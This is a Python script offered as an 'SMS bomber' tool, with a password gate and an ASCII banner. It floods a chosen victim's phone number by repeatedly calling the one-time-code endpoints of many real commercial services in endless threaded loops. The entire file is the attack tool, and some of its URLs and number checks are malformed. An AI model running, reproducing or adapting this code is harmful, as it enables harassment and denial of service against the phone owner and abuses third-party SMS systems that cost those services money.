import os
import time
import threading
import requests

PASSWORD = "crypticx"

def banner():
    os.system("clear")
    print(r"""\033[1;32m
           
 ▗▄▄▖▗▄▄▖▗▖  ▗▖▗▄▄▖▗▄▄▄▖▗▄▄▄▖ ▗▄▄▖▗▖  ▗▖
▐▌   ▐▌ ▐▌▝▚▞▘ ▐▌ ▐▌ █    █  ▐▌    ▝▚▞▘ 
▐▌   ▐▛▀▚▖ ▐▌  ▐▛▀▘  █    █  ▐▌     ▐▌  
▝▚▄▄▖▐▌ ▐▌ ▐▌  ▐▌    █  ▗▄█▄▖▝▚▄▄▖▗▞▘▝▚▖
                                                                                                                            
                                                                                        
CRYPTICX  BD SMS BOMBER v2.0
\033[0m""")

def password_prompt():
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    if pw != PASSWORD:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()
    print("\033[1;32m[+] Access Granted!\033[0m")
    time.sleep(1)

def menu():
    banner()
    print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
    choice = input("Select an option: ")
    if choice == "1":
        start_bombing()
    else:
        print("\033[1;31m[-] Exiting...\033[0m")
        exit()

def get_target():
    number = input("Enter target number (05XXXXXXXX): ")
    if number.startswith("01") and len(number) == 11:
        return number, "966" + number[1:]
    else:
        print("Invalid number format.")
        exit()

counter = 0
lock = threading.Lock()

def update_counter():
    global counter
    with lock:
        counter += 1
        print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")

def fast_apis(phone, full):
    try:
        requests.get(f"https://ar.shein.com/bff-api/user/account/send_sms_code?_ver=1.1.8&_lang=ar{full}&lang=en&ng=0")
        update_counter()
    except: pass

    try:
        requests.get(f"https://ws.alibaba.ir/api/v3/account/mobile/otp{phone}")
        update_counter()
    except: pass

def normal_apis(phone, full):
    apis = [
        ("https://ws.alibaba.ir/api/v3/account/mobile/otp", {"msisdn": full}),
        ("https://https://ar.shein.com/bff-api/user/account/send_sms_code?_ver=1.1.8&_lang=ar", {"phone": phone}),
        ("https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin", {"phone": phone}),
        ("https://api.komodaa.com/api/v2.6/loginRC/request", {"phone": phone}),
        ("https://www.vitrin.shop/api/v1/user/request_code", {"phone": phone}),
        ("https://api.torob.com/a/phone/send-pin/?phone_number=0", {"mobile": phone}),
        ("https://www.hamrah-mechanic.com/api/v1/membership/otp", {"phone": phone}),
        ("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", {"msisdn": full}),
    ]

    for url, data in apis:
        try:
            requests.post(url, json=data)
            update_counter()
        except: pass

def start_bombing():
    phone, full = get_target()
    while True:
        threads = []

        for _ in range(3):
            t = threading.Thread(target=fast_apis, args=(phone, full))
            t.start()
            threads.append(t)

        t = threading.Thread(target=normal_apis, args=(phone, full))
        t.start()
        threads.append(t)

        for t in threads:
            t.join()
        time.sleep(1)

if __name__ == "__main__":
    banner()
    password_prompt()
    menu()
